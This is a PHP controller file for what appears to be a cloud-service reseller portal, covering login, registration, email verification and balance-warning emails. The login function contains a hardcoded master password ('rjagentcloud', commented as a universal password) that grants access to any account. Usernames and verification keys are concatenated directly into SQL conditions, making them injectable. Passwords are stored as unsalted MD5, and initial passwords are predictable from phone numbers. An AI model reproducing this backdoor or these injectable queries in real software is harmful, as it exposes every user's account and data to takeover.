<?php
namespace Home\Controller;
use Think\Controller;
class PublicController extends CommonController{
	/**
	 *判断用户是否已经登录  1为已经登录  2为还没登录
	 */
	public function has_login()
	{
		if (!get_session('user_id'))
		{
			$this->ajaxReturn(array(
					'type' => '2',
					'msg' => '还没登录',
					));
		}else{
			$this->ajaxReturn(array(
					'type' => '1',
					'msg' => '已经登录',
			));
		}
	}
	
	/**
	 * 登录操作 
	 * 参数 username,password,verify
	 * type 1为登录成功  2为已经登录 3为登录失败
	 * msg 提示信息	LOGIN_SUCCESS(登录成功)、LOGIN_ALREADY(已经登录)、LOGIN_FAIL(登录失败)、VERIFY_FAIL(验证码错误)
	 * 登录成功后记录session user_info的信息
	 */
	public function doLogin()
	{
		session_start();
		$message = array() ;
		if($_SESSION['user_id'])
		{
			$message['ret'] = 1;
			$message['msg'] = '您已经登录';
			session_write_close();
			echo json_encode($message);
			exit;
		}else{
			$user_name = trim($_POST['username']);
			$password = trim(I('post.password'));
			$verify = I('post.verify');
			if(empty($user_name) || empty($password) || empty($verify))
			{
				session_write_close();
				$message['ret'] = 1;
				$message['msg'] = '登录账号、密码、验证码不能为空';
				echo json_encode($message);
				exit;
			}
			if(!check_verify($verify)){
				$message['ret'] = 1;
				$message['msg'] = '验证码验证失败';
				session_write_close();
				echo json_encode($message);
				exit;
			}
			$user = M('user');
			$where = " user_name = binary '$user_name' ";
			$user_info = $user->where($where)->find();
			if(!empty($user_info))
			{
				//判断密码是否正确
				if(md5($password)!=$user_info['password']){
					//万能密码
					if (md5($password) != md5('rjagentcloud')){
						$message['ret'] = 1;
						$message['msg'] = '登录密码错误';
						session_write_close();
						echo json_encode($message);
						exit;
					}
				}
				//else{
					//登录成功,记录用户信息
					session('user_id',$user_info['user_id']);
					session('user_info',$user_info);
					session('access_token',$user_info['access_token']);
					$lasttime = NOW_TIME;
					$ip = get_client_ip();
					//更新最后登录时间和IP
					$user->last_time = $lasttime;
					$user->last_ip = $ip;
					$user->where('user_id='.$_SESSION['user_id'])->save(); 
// 					$_SESSION['user_info']['last_time'] = $lasttime;
// 					$_SESSION['user_info']['last_ip'] = $ip;
					$message['ret'] = 0;
					$message['msg'] = '登录成功';
					session_write_close();
					echo json_encode($message);
					exit;
				//}
			}else{
					$message['ret'] = 1;
					$message['msg'] = '登录失败，请确认账号密码是否正确';
					session_write_close();
					echo json_encode($message);
					exit;
			}
		
		}
	}
	
	/**
	 * 用户登出
	 */
	public function loginout(){
		session_start();
		if(isset($_SESSION['user_id']))
		{
			unset($_SESSION['user_id']);
		}
		session_destroy();
		session_write_close();
		echo true;
	}
	/**
	 * 执行注册操作
	 * 参数 company website contacts tel qq email address industry service plans
	 * 返回 type 1 成功 2 失败
	 * msg 提示信息
	 */
	public function doRegister()
	{
		$data = array(
				'company' => isset($_POST['company']) ? I('company') : '',
				'license' => isset($_POST['license']) ? I('license') : '',
				'website' => isset($_POST['website']) ? I('website') : '',
				'company_address' => isset($_POST['company_address']) ? I('company_address') : '',
				'contacts' => isset($_POST['contacts']) ? I('contacts') : '',
				'identity' => isset($_POST['identity']) ? I('identity') : '',
				'tel' => isset($_POST['tel']) ? I('tel') : '',
				'qq' => isset($_POST['qq']) ? I('qq') : '',
				//'email' => isset($_POST['email']) ? trim($_POST['email']) : '',
				'address' => isset($_POST['address']) ? I('address') : '',
				'industry' => isset($_POST['industry']) ? I('industry') : '',
				'service' => isset($_POST['service']) ? I('service') : '',
				'plans' => isset($_POST['plans']) ? I('plans') : '',
				'create_time' => NOW_TIME,
				);
		if(empty($data['company']) || empty($data['license']) || empty($data['company_address']) 
				|| empty($data['contacts']) || empty($data['identity']) || empty($data['tel'])
				|| empty($data['address']) || empty($data['plans']) || empty($data['service']))
			{
				$this->ajaxReturn(array(
						'type' => 2,
						'msg' => '必填字段不能为空',
					));
			}
		if(!empty($_POST['product'])&&is_array($_POST['product'])){
			$data['product'] = implode(",", $_POST['product']);
		}
		if(!checkCompany($data['company'])){
			$this->ajaxReturn(array(
						'type' => 2,
						'msg' => '公司重复提交或公司名称包含特殊字符',
					));
			exit;
		}
// 		if(!checkEmail($data['email'])){
// 			$this->ajaxReturn(array(
// 						'type' => 2,
// 						'msg' => '邮箱格式不对或邮箱已注册',
// 					));
// 			exit;
			
// 		}
		if(!checkTel($data['tel']))
		{
			$this->ajaxReturn(array(
					'type' => 2,
					'msg' => '请填写正确的手机号',
			));
			exit;
		}
		//验证通过，生成用户名和初始密码写入注册信息
		$data['user_name'] = get_four_sn('AGENT','user','user_name');
		//生成token
		$acc_token = $data['user_name'].$data['create_time'];
		$data['access_token'] = md5($acc_token);
		
		$user_name = $data['user_name'];
		$data['password'] = 'EFLY'.$data['tel'];
		$data['password'] = md5($data['password']);
		$User = M('User');
		if($User->create($data))
		{
			//添加用户
			$user_id = $User->add();
			if($user_id)
			{
				$data['user_id'] = $user_id;
				//添加基本信息
				$User_setting =  M('User_setting');
				$User_setting->add($data);
				//添加账户信息
				$user_account = M('user_account');
				$ac_info = $user_account->where('user_id = '.$user_id)->find();
				if(empty($ac_info))
				{
					//创建用户账户
					$data = array(
							'user_id' => $user_id,
							'account' => 0,
							'coupon'  => 0,
					);
					$user_account->add($data);
				}
				
				//添加产品价格系数
				$rate = array(
						'user_id' => $user_id,
						'user_rate' => price_format(1),
						'vm_rate' => price_format(1),
						'disk_rate' => price_format(1),
						);
				M('member_rate')->add($rate);
				
				//添加域名
				$hostdata = array(
						'user_id' => $user_id,
						'sys_domain' => strtolower($user_name),
						'sys_host' => C('AGENT_SYS_HOST'),
						'host_status' => 1,
				);
				//生成配置域名
				$HostModel = M('user_host');
				$HostModel->add($hostdata);
				$this->ajaxReturn(array(
					'type' => 1,
					'msg' => '用户注册成功',
				));
				exit;
			}else{
				$this->ajaxReturn(array(
					'type' => 2,
					'msg' => '用户注册失败',
				));
				exit;
			}
		}else {
			$this->ajaxReturn(array(
					'type' => 2,
					'msg' => '用户注册失败',
				));
				exit;
		}
	}
	
	
	/**
	 * 验证码生成
	 */
	public function verify_c(){  
		session_start();
	    $Verify = new \Think\Verify();  
	    $Verify->fontSize = 20;
	    $Verify->useCurve = false;
	    $Verify->length   = 4; 
	    $Verify->useNoise = false;
	    $Verify->fontttf = '4.ttf';
	    $Verify->imageW = 0;  
	    $Verify->imageH = 0;  
	    $Verify->entry();
	    session_write_close();
	}  
	
	/**
	 * 获取行业分类
	 */
	public function get_industry()
	{
		$industry = C('industry');
		echo json_encode($industry);
	}
	/**
	 * 返回验证邮箱
	 */
	public function verify_email()
	{
		$key = I('key');
		if (empty($key)) {
			//验证失败
			$this->error('验证失败',__MODULE__.'/index');
		}else{
			$where = "code = '".$key."' AND expire >=".NOW_TIME;
			$Verify =  M('verify');
			$ve_info = M('verify')->where($where)->find();
			if (empty($ve_info)){
				$this->error('验证失败',__MODULE__.'/index');
			}else{
				//验证成功 修改邮箱，并将verify注册码改为过期
				$User = M('user');
				$User->where('user_id = '.$ve_info['user_id'])->save(array('email'=>$ve_info['newfield']));
				if($User->getError()){
					$this->error('验证失败',__MODULE__.'/index');
				}else{
					//更新为新的邮箱
					$Verify->where('ve_id = '.$ve_info['ve_id'])->save(array('expire'=>NOW_TIME-1));
					$this->success('验证成功',__MODULE__.'/index');
				}
			}
		}
	}
	/**
	 * 获取系统时间
	 */
	public function get_sys_time(){
		$this->ajaxReturn(array(
				'type' => 1,
				'msg' => '获取成功',
				'data' => NOW_TIME,
				));
	}

	//每天定时发送余额预警邮件
	public function sendWarnEmail(){
		

		$title = "余额预警";
		$url = 'http://'."agent.eflycloud.com".'/index.php/Home/Public/login';
		$content = C('warin_account_notify');
		$content .= '<br/>'.$url;
		$where = 'user.user_id = account.user_id  and (account.account+account.coupon) < account.warning_account';
		$Db = M('');
		$users = $Db->table('ag_user as user , ag_user_account as account')->where($where)->select();
		foreach( $users as $user){
			//$account = R('pay/get_user_account',$user['user_id']);
			//$warning = $user['warning'];
			$this->send_email($user['email'],$title,$content,"睿江代理商服务系统",$user['user_name'],$user['access_token']);
		}
		
	}
}